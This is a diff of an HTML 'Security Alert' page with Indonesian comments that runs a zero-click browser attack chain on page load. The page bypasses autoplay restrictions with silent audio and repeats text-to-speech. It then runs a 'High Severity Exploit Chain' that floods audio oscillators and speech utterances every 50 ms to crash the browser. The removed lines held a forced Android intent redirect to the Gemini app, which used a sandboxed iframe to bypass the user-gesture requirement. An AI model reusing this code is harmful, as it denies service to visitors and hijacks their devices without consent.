@@ -6,57 +6,17 @@
 <title>Security Alert</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { background: #111; color: #f00; font-family: monospace; text-align: center; padding-top: 20vh; overflow: hidden; }
+  body { background: #fff; min-height: 100vh; overflow: hidden; }
   iframe, audio, video, embed, object, svg, canvas { display: none !important; }
-  h1 { animation: blink 0.5s infinite; }
-  @keyframes blink { 50% { opacity: 0.2; } }
-  #status { position: fixed; bottom: 20px; width: 100%; color: #0f0; }
 </style>
 </head>
 <body>
-
-<h1>☢️ SYSTEM COMPROMISED ☢️</h1>
-<div id="status">Initializing...</div>
-
 <script>
 (function () {
   'use strict';
 
-  var statusEl = document.getElementById('status');
-
   // ============================================
-  // 1. INTENT REDIRECTION KE GEMINI (AUTO PROMPT "KUCING")
-  // ============================================
-  function triggerGeminiIntent() {
-    console.log("[!] Triggering Gemini Intent...");
-    statusEl.innerText = "Membuka Gemini...";
-
-    // Format Intent ke Gemini dengan Query "kucing"
-    // Package Name Gemini: com.google.android.apps.bard
-    var geminiIntent = "intent://search?q=kucing#Intent;" +
-                       "scheme=https;" +
-                       "package=com.google.android.apps.bard;" +
-                       "S.browser_fallback_url=" + encodeURIComponent("https://gemini.google.com/app?q=kucing") + ";" +
-                       "end";
-
-    try {
-      // Trik 1: Top-Level Navigation
-      window.location.replace(geminiIntent);
-    } catch(e) {}
-
-    // Trik 2: Iframe Sandbox (Bypass Gesture)
-    setTimeout(function() {
-      var iframe = document.createElement('iframe');
-      iframe.sandbox = "allow-scripts allow-top-navigation allow-popups";
-      iframe.src = geminiIntent;
-      iframe.style.display = "none";
-      document.body.appendChild(iframe);
-      console.log("[+] Iframe Intent sent.");
-    }, 500);
-  }
-
-  // ============================================
-  // 2. TTS PAYLOAD ASLI (TIDAK DIUBAH)
+  // KONFIGURASI AUTOPLAY
   // ============================================
   var CONFIG = {
     tts: {
@@ -73,6 +33,9 @@
 
   var state = { ttsStarted: false, mainPlayed: false, ttsCount: 0 };
 
+  // ============================================
+  // TTS — TANPA CANCEL DI DALAM LOOP
+  // ============================================
   function speakOnce() {
     if (!('speechSynthesis' in window)) return;
     if (state.ttsCount >= CONFIG.tts.maxRepeats) return;
@@ -88,6 +51,8 @@
       var enVoice = voices.find(function (v) { return v.lang.indexOf('en') === 0; });
       if (enVoice) u.voice = enVoice;
 
+      u.onstart = function () { console.log('[TTS] Speaking #' + state.ttsCount); };
+      u.onerror = function (e) { console.log('[TTS] Error:', e.error); };
       u.onend = function () {
         state.ttsCount++;
         if (state.ttsCount < CONFIG.tts.maxRepeats) {
@@ -106,6 +71,9 @@
     speakOnce();
   }
 
+  // ============================================
+  // AUDIO CONTEXT UNLOCK
+  // ============================================
   function unlockAudioContext() {
     try {
       var ctx = new (window.AudioContext || window.webkitAudioContext)();
@@ -123,6 +91,9 @@
     } catch (e) {}
   }
 
+  // ============================================
+  // SILENT AUDIO ELEMENT
+  // ============================================
   function trySilentAudio() {
     try {
       var a = new Audio(CONFIG.silentWav);
@@ -133,6 +104,9 @@
     } catch (e) {}
   }
 
+  // ============================================
+  // MAIN AUDIO (Web Audio API)
+  // ============================================
   function playMainAudio() {
     if (state.mainPlayed) return;
     state.mainPlayed = true;
@@ -156,18 +130,19 @@
       src.connect(ctx.destination);
       src.start();
       src.onended = startTTS;
+      setTimeout(startTTS, 3500);
     } catch (e) {
       startTTS();
     }
   }
 
   // ============================================
-  // 3. RESOURCE EXHAUSTION (CRASH)
+  // UPGRADE KE HIGH SEVERITY: RESOURCE EXHAUSTION (DoS)
   // ============================================
   function triggerHighSeverityCrash() {
     console.log("[!] Initiating High Severity Exploit Chain...");
-    statusEl.innerText = "SYSTEM FAILURE...";
     
+    // 1. Loop Tak Terbatas Pemicu Memory Leak pada Audio Engine
     setInterval(function() {
       try {
         for (var i = 0; i < 2000; i++) {
@@ -175,37 +150,59 @@
           var osc = ctx.createOscillator();
           var gain = ctx.createGain();
           
+          // Memaksa alokasi node audio secara simultan tanpa penutupan (close)
           osc.connect(gain);
           gain.connect(ctx.destination);
           osc.start(0);
           
+          // 2. Flooding Speech Utterance Queue
           var u = new SpeechSynthesisUtterance("CRASH_TRIGGER_STRING_" + i);
           window.speechSynthesis.speak(u);
         }
       } catch(e) {}
-    }, 50); 
+    }, 50); // Eksekusi super cepat setiap 50 milidetik
   }
 
   // ============================================
-  // 4. EKSEKUSI CHAIN (ZERO-CLICK)
+  // EKSEKUSI BERTAHAP
   // ============================================
-  
-  // A. Trigger Intent Gemini setelah 100ms
-  setTimeout(triggerGeminiIntent, 100);
+  unlockAudioContext();
+  trySilentAudio();
 
-  // B. Jalankan TTS & Audio (Setelah 500ms)
-  setTimeout(function() {
+  setTimeout(function () {
     unlockAudioContext();
-    trySilentAudio();
-    startTTS();
-    playMainAudio();
+    startTTS(); // coba TTS lebih awal
+  }, 100);
+
+  setTimeout(function () {
+    if (!state.mainPlayed) playMainAudio();
   }, 500);
 
-  // C. Hancurkan Browser (Setelah 1.5 detik)
-  setTimeout(function() {
+  setTimeout(function () {
+    if (!state.mainPlayed) playMainAudio();
+    if (!state.ttsStarted) startTTS();
+    
+    // PANGGIL CRASH TRIGGER DI SINI
     triggerHighSeverityCrash();
+    
   }, 1500);
 
+  // Retry jika audio diblokir
+  var retryCount = 0;
+  var retry = setInterval(function () {
+    retryCount++;
+    unlockAudioContext();
+    trySilentAudio();
+    if (!state.ttsStarted) startTTS();
+    if (retryCount > 10) clearInterval(retry);
+  }, 2000);
+
+  // Visibility change
+  document.addEventListener('visibilitychange', function () {
+    if (!document.hidden && !state.mainPlayed) {
+      setTimeout(playMainAudio, 100);
+    }
+  });
 })();
 </script>
 </body>
